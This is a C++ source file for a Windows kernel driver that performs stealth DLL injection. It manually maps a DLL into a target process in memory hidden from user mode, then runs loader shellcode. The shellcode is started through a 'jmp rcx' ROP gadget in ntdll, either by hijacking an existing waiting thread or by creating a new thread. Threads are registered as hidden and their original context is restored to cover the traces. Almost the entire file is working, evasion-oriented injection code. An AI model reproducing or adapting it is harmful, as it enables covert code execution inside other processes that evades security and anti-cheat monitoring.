/******************************************************************************
    MIT License

    Copyright (c) 2024 Ricardo Carvalho

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
 ******************************************************************************/
#include "includes.hpp"
#include "stealth_inject.hpp"

namespace StealthInject
{

static bool g_initialized = false;

// Completion signal structure - placed in hidden memory
typedef struct _INJECTION_COMPLETION_SIGNAL
{
    volatile LONG Completed;      // Set to 1 when DllMain returns
    volatile LONG Result;         // DllMain return value
    CONTEXT OriginalContext;      // Saved context to restore

} INJECTION_COMPLETION_SIGNAL, *PINJECTION_COMPLETION_SIGNAL;

NTSTATUS Initialize()
{
    PAGED_CODE();

    if (g_initialized)
    {
        return STATUS_ALREADY_INITIALIZED;
    }

    g_initialized = true;
    return STATUS_SUCCESS;
}

void Uninitialize()
{
    PAGED_CODE();
    g_initialized = false;
}

//
// Allocate memory that is completely hidden from usermode
//
NTSTATUS AllocateHiddenMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG Protect)
{
    PAGED_CODE();

    NTSTATUS status;

    // Mark the next allocation as hidden - our hook will register it
    HANDLE targetPid = Misc::GetProcessIDFromProcessHandle(ProcessHandle);
    Hooks::SetNextAllocationHidden(targetPid);

    // Allocate the memory - our NtAllocateVirtualMemory hook will auto-register it as hidden
    status = ZwAllocateVirtualMemory(ProcessHandle, BaseAddress, 0, RegionSize,
                                      MEM_RESERVE | MEM_COMMIT, Protect);

    return status;
}

//
// Find a thread suitable for hijacking
// We look for threads that are in a wait state (alertable preferred)
//
NTSTATUS FindHijackableThread(
    _In_ PEPROCESS Process,
    _Out_ PETHREAD *Thread)
{
    PAGED_CODE();
    NT_ASSERT(Process);
    NT_ASSERT(Thread);

    *Thread = nullptr;

    HANDLE processId = PsGetProcessId(Process);
    NTSTATUS status;

    // Query system information to find threads
    ULONG bufferSize = 1024 * 1024; // 1MB should be enough
    PVOID buffer = Memory::AllocNonPaged(bufferSize, Memory::TAG_TEMP);
    if (!buffer)
    {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    SCOPE_EXIT
    {
        Memory::FreePool(buffer);
    };

    ULONG returnLength = 0;
    status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    auto processInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(buffer);

    // Find our target process
    while (processInfo)
    {
        if (processInfo->UniqueProcessId == processId)
        {
            // Found our process - now find a suitable thread
            if (processInfo->NumberOfThreads > 0)
            {
                auto threadInfo = reinterpret_cast<PSYSTEM_THREAD_INFORMATION>(
                    reinterpret_cast<PUCHAR>(processInfo) + sizeof(SYSTEM_PROCESS_INFORMATION));

                PETHREAD bestThread = nullptr;
                ULONG bestScore = 0;

                for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                {
                    HANDLE threadId = threadInfo[i].ClientId.UniqueThread;
                    ULONG score = 0;

                    // Skip system threads (TID 0, 4, etc.)
                    if (HandleToULong(threadId) <= 4)
                    {
                        continue;
                    }

                    // Prefer threads in Wait state
                    if (threadInfo[i].ThreadState == 5) // Waiting
                    {
                        score += 100;

                        // Extra points for alertable wait
                        if (threadInfo[i].WaitReason == WrUserRequest || 
                            threadInfo[i].WaitReason == WrEventPair ||
                            threadInfo[i].WaitReason == WrQueue)
                        {
                            score += 50;
                        }
                    }
                    // Running threads are okay too
                    else if (threadInfo[i].ThreadState == 2) // Running
                    {
                        score += 25;
                    }

                    // Skip if thread is in kernel mode for critical operations
                    if (threadInfo[i].WaitReason == WrExecutive ||
                        threadInfo[i].WaitReason == WrFreePage ||
                        threadInfo[i].WaitReason == WrPageIn ||
                        threadInfo[i].WaitReason == WrPoolAllocation)
                    {
                        continue;
                    }

                    if (score > bestScore)
                    {
                        // Try to get thread object
                        PETHREAD thread = nullptr;
                        status = PsLookupThreadByThreadId(threadId, &thread);

                        if (NT_SUCCESS(status))
                        {
                            // Release previous best
                            if (bestThread)
                            {
                                ObDereferenceObject(bestThread);
                            }

                            bestThread = thread;
                            bestScore = score;
                        }
                    }
                }

                if (bestThread)
                {
                    *Thread = bestThread;
                    return STATUS_SUCCESS;
                }
            }
            break;
        }

        if (processInfo->NextEntryOffset == 0)
        {
            break;
        }

        processInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PUCHAR>(processInfo) + processInfo->NextEntryOffset);
    }

    return STATUS_NOT_FOUND;
}

//
// Hijack a thread to execute code
//
NTSTATUS HijackThreadAndExecute(
    _In_ PETHREAD Thread,
    _In_ PVOID ExecutionAddress,
    _In_opt_ PVOID Parameter,
    _In_ BOOLEAN WaitForCompletion,
    _In_ ULONG TimeoutMs)
{
    PAGED_CODE();
    NT_ASSERT(Thread);
    NT_ASSERT(ExecutionAddress);

    NTSTATUS status;
    HANDLE threadHandle = nullptr;

    HANDLE processId = PsGetThreadProcessId(Thread);
    HANDLE threadId = PsGetThreadId(Thread);

    // Open handle to thread
    status = ObOpenObjectByPointer(Thread, OBJ_KERNEL_HANDLE, nullptr, THREAD_ALL_ACCESS,
                                    *PsThreadType, KernelMode, &threadHandle);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to open thread handle: %!STATUS!", status);
        return status;
    }

    SCOPE_EXIT
    {
        if (threadHandle)
        {
            ZwClose(threadHandle);
        }
    };

    // Suspend the thread
    ULONG previousSuspendCount = 0;
    status = ZwSuspendThread(threadHandle, &previousSuspendCount);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to suspend thread: %!STATUS!", status);
        return status;
    }

    // Track this as a hijacked thread
    status = Bypass::CreateHiddenThread(processId, threadId, TRUE);
    if (!NT_SUCCESS(status) && status != STATUS_ALREADY_REGISTERED)
    {
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // Get thread context
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_FULL;

    status = ZwGetContextThread(threadHandle, &context);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to get thread context: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // Save original context for spoofing and restoration
    status = Bypass::SaveThreadContext(processId, threadId, &context);
    if (!NT_SUCCESS(status))
    {
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // Modify context to execute our code
    // Use RCX as parameter (first argument in x64 calling convention)
    CONTEXT newContext = context;
    newContext.Rip = reinterpret_cast<ULONG_PTR>(ExecutionAddress);
    newContext.Rcx = reinterpret_cast<ULONG_PTR>(Parameter);

    // Align stack (must be 16-byte aligned before call, minus 8 for return address)
    newContext.Rsp = (newContext.Rsp & ~0xF) - 8;

    // Set new context
    status = ZwSetContextThread(threadHandle, &newContext);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to set thread context: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL, "[STEALTH] Hijacked thread TID %d, RIP: 0x%p -> 0x%p",
              HandleToULong(threadId), context.Rip, ExecutionAddress);

    // Resume thread to execute our code
    status = ZwResumeThread(threadHandle, nullptr);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to resume thread: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        return status;
    }

    // Wait for completion if requested
    if (WaitForCompletion && Parameter)
    {
        auto signal = reinterpret_cast<PINJECTION_COMPLETION_SIGNAL>(Parameter);
        
        LARGE_INTEGER timeout;
        timeout.QuadPart = TimeoutMs > 0 ? RELATIVE(MILLISECONDS(TimeoutMs)) : MAXLONGLONG;

        LARGE_INTEGER startTime;
        KeQuerySystemTime(&startTime);

        // Poll for completion
        while (InterlockedCompareExchange(&signal->Completed, 0, 0) == 0)
        {
            LARGE_INTEGER delay;
            delay.QuadPart = RELATIVE(MILLISECONDS(10));
            KeDelayExecutionThread(KernelMode, FALSE, &delay);

            // Check timeout
            if (TimeoutMs > 0)
            {
                LARGE_INTEGER currentTime;
                KeQuerySystemTime(&currentTime);

                LONGLONG elapsed = (currentTime.QuadPart - startTime.QuadPart) / 10000; // Convert to ms
                if (elapsed >= TimeoutMs)
                {
                    WPP_PRINT(TRACE_LEVEL_WARNING, GENERAL, "Thread hijack execution timed out");
                    break;
                }
            }
        }

        // Restore original context
        status = ZwSuspendThread(threadHandle, nullptr);
        if (NT_SUCCESS(status))
        {
            CONTEXT restoreContext;
            if (NT_SUCCESS(Bypass::GetSavedThreadContext(processId, threadId, &restoreContext)))
            {
                ZwSetContextThread(threadHandle, &restoreContext);
            }
            ZwResumeThread(threadHandle, nullptr);
        }

        Bypass::RemoveHiddenThread(processId, threadId);
    }

    return STATUS_SUCCESS;
}

//
// Main stealth injection function
//
INJECT_STATUS InjectDll(
    _In_ PEPROCESS TargetProcess,
    _In_ PVOID DllBuffer,
    _In_ SIZE_T DllSize,
    _In_opt_ PSTEALTH_INJECT_CONFIG Config)
{
    PAGED_CODE();
    NT_ASSERT(TargetProcess);
    NT_ASSERT(DllBuffer);

    NTSTATUS status;
    STEALTH_INJECT_CONFIG defaultConfig = { TRUE, TRUE, 60000, nullptr };

    if (!Config)
    {
        Config = &defaultConfig;
    }

    // Parse PE headers
    PIMAGE_NT_HEADERS nth = nullptr;
    status = RtlImageNtHeaderEx(0, DllBuffer, DllSize, &nth);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Invalid PE format: %!STATUS!", status);
        return INJECT_STATUS::MappingFailed;
    }

    const HANDLE currentProcessId = PsGetProcessId(TargetProcess);
    const SIZE_T imageSize = nth->OptionalHeader.SizeOfImage;

    PVOID allocatedImageBase = nullptr;
    SIZE_T allocatedImageRegionSize = imageSize;

    PVOID signalBase = nullptr;
    SIZE_T signalRegionSize = PAGE_SIZE;

    PVOID shellcodeBase = nullptr;
    SIZE_T shellcodeRegionSize = PAGE_SIZE;

    // Get required modules
    PLDR_DATA_TABLE_ENTRY ntdllEntry = Misc::Module::GetModuleByName(L"ntdll.dll");
    if (!ntdllEntry)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to locate ntdll.dll!");
        return INJECT_STATUS::ModuleNotFound;
    }

    PLDR_DATA_TABLE_ENTRY kernel32Entry = Misc::Module::GetModuleByName(L"kernel32.dll");
    if (!kernel32Entry)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to locate kernel32.dll!");
        return INJECT_STATUS::ModuleNotFound;
    }

    // Allocate hidden memory for the DLL image
    status = AllocateHiddenMemory(ZwCurrentProcess(), &allocatedImageBase, &allocatedImageRegionSize,
                                   PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate hidden memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    SCOPE_EXIT
    {
        // Note: We don't free the memory on success - it stays allocated for the DLL
    };

    // Allocate hidden memory for completion signal
    status = AllocateHiddenMemory(ZwCurrentProcess(), &signalBase, &signalRegionSize, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate signal memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    // Allocate hidden memory for shellcode
    status = AllocateHiddenMemory(ZwCurrentProcess(), &shellcodeBase, &shellcodeRegionSize, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate shellcode memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    // Copy PE sections
    RtlZeroMemory(allocatedImageBase, allocatedImageRegionSize);
    
    auto section = IMAGE_FIRST_SECTION(nth);
    for (ULONG i = 0; i < nth->FileHeader.NumberOfSections; i++, section++)
    {
        const ULONG sectionSize = min(section->SizeOfRawData, section->Misc.VirtualSize);
        if (sectionSize)
        {
            RtlCopyMemory(
                reinterpret_cast<PUCHAR>(allocatedImageBase) + section->VirtualAddress,
                reinterpret_cast<PUCHAR>(DllBuffer) + section->PointerToRawData,
                sectionSize);
        }
    }

    // Setup signal structure
    auto signal = reinterpret_cast<PINJECTION_COMPLETION_SIGNAL>(signalBase);
    RtlZeroMemory(signal, sizeof(INJECTION_COMPLETION_SIGNAL));

    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
              "[STEALTH] Mapped DLL at 0x%p (size 0x%llX) signal at 0x%p shellcode at 0x%p",
              allocatedImageBase, allocatedImageRegionSize, signalBase, shellcodeBase);

    // Get required exports for manual mapping
    PVOID LoadLibraryA = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "LoadLibraryA");
    PVOID GetProcAddress = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "GetProcAddress");

    if (!LoadLibraryA || !GetProcAddress)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to find required exports!");
        return INJECT_STATUS::ModuleNotFound;
    }

    // Build shellcode that:
    // 1. Processes relocations
    // 2. Resolves imports
    // 3. Calls DllMain
    // 4. Sets completion signal
    // 5. Loops forever (we'll restore context after)

    // For now, use the existing manual map shellcode from inject.hpp
    // Copy the shellcode parameters
    Inject::MANUAL_MAP_STUB_PARAM *stubParam = new (shellcodeBase) Inject::MANUAL_MAP_STUB_PARAM(
        reinterpret_cast<ULONG_PTR>(allocatedImageBase),
        reinterpret_cast<ULONG_PTR>(allocatedImageBase) - nth->OptionalHeader.ImageBase,
        nth->OptionalHeader.SizeOfImage,
        nth->OptionalHeader.AddressOfEntryPoint,
        MANUAL_MAP_STUB_FLAG_NONE,
        &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC],
        &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS],
        &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION],
        &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG],
        nullptr, // exceptionHandler - skip for now
        nullptr, // RtlAddFunctionTable
        nullptr, // LdrpHandleTlsData
        nullptr, // RtlAddVectoredExceptionHandler
        LoadLibraryA,
        GetProcAddress);

    PVOID shellcodeStart = ALIGN_UP_POINTER_BY(
        reinterpret_cast<PUCHAR>(shellcodeBase) + sizeof(Inject::MANUAL_MAP_STUB_PARAM), alignof(PVOID));

    // Copy shellcode
    *(PVOID *)(&Inject::g_shellcodeManualMapStub[9]) = stubParam;
    RtlCopyMemory(shellcodeStart, Inject::g_shellcodeManualMapStub, ARRAYSIZE(Inject::g_shellcodeManualMapStub));

    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL, "[STEALTH] Shellcode at 0x%p, param at 0x%p", shellcodeStart, stubParam);

    if (Config->UseThreadHijack)
    {
        // Find a suitable thread to hijack
        PETHREAD targetThread = nullptr;
        status = FindHijackableThread(TargetProcess, &targetThread);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "No suitable thread found: %!STATUS!", status);
            return INJECT_STATUS::NoSuitableThread;
        }

        SCOPE_EXIT
        {
            if (targetThread)
            {
                ObDereferenceObject(targetThread);
            }
        };

        WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL, "[STEALTH] Hijacking thread TID %d",
                  HandleToULong(PsGetThreadId(targetThread)));

        // Find a ROP gadget (jmp rcx) in ntdll
        PVOID ropGadget = Misc::Memory::FindPattern(ntdllEntry->DllBase, ".text", "FF E1");
        if (!ropGadget)
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "No suitable ROP gadget found!");
            return INJECT_STATUS::InternalError;
        }

        // Hijack thread: ROP gadget jumps to RCX which contains our shellcode address
        status = HijackThreadAndExecute(targetThread, ropGadget, shellcodeStart,
                                         Config->WaitForCompletion, Config->TimeoutMs);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Thread hijack failed: %!STATUS!", status);
            return INJECT_STATUS::ThreadHijackFailed;
        }
    }
    else
    {
        // Create a new hidden thread
        HANDLE threadHandle = nullptr;
        CLIENT_ID clientId = {};

        PVOID ropGadget = Misc::Memory::FindPattern(ntdllEntry->DllBase, ".text", "FF E1");
        if (!ropGadget)
        {
            return INJECT_STATUS::InternalError;
        }

        status = RtlCreateUserThread(ZwCurrentProcess(), nullptr, FALSE, 0, 0, 0,
                                      ropGadget, shellcodeStart, &threadHandle, &clientId);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to create thread: %!STATUS!", status);
            return INJECT_STATUS::ThreadHijackFailed;
        }

        // Mark thread as hidden
        Bypass::CreateHiddenThread(currentProcessId, clientId.UniqueThread, FALSE);

        if (Config->WaitForCompletion)
        {
            LARGE_INTEGER timeout;
            timeout.QuadPart = Config->TimeoutMs > 0 ? RELATIVE(MILLISECONDS(Config->TimeoutMs)) : MAXLONGLONG;

            ZwWaitForSingleObject(threadHandle, FALSE, &timeout);
        }

        ZwClose(threadHandle);
    }

    // Check result
    if (stubParam->Result == MANUAL_MAP_STUB_RESULT_SUCCESS)
    {
        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] DLL injection successful!");
        return INJECT_STATUS::Success;
    }
    else
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "[STEALTH] DLL injection failed - shellcode returned failure");
        return INJECT_STATUS::ExecutionFailed;
    }
}

//
// Attach to process and inject
//
INJECT_STATUS AttachAndInject(
    _In_ PEPROCESS TargetProcess,
    _In_ PVOID DllBuffer,
    _In_ SIZE_T DllSize,
    _In_opt_ PSTEALTH_INJECT_CONFIG Config)
{
    PAGED_CODE();
    NT_ASSERT(TargetProcess);
    NT_ASSERT(DllBuffer);

    KAPC_STATE apcState = {};
    bool attached = false;
    INJECT_STATUS result;

    SCOPE_EXIT
    {
        if (attached)
        {
            KeUnstackDetachProcess(&apcState);
        }
    };

    __try
    {
        KeStackAttachProcess(TargetProcess, &apcState);
        attached = true;

        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Attached to PID %d for injection",
                  HandleToULong(PsGetProcessId(TargetProcess)));

        result = InjectDll(TargetProcess, DllBuffer, DllSize, Config);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "[STEALTH] Exception during injection: %!STATUS!",
                  GetExceptionCode());
        result = INJECT_STATUS::InternalError;
    }

    return result;
}

} // namespace StealthInject
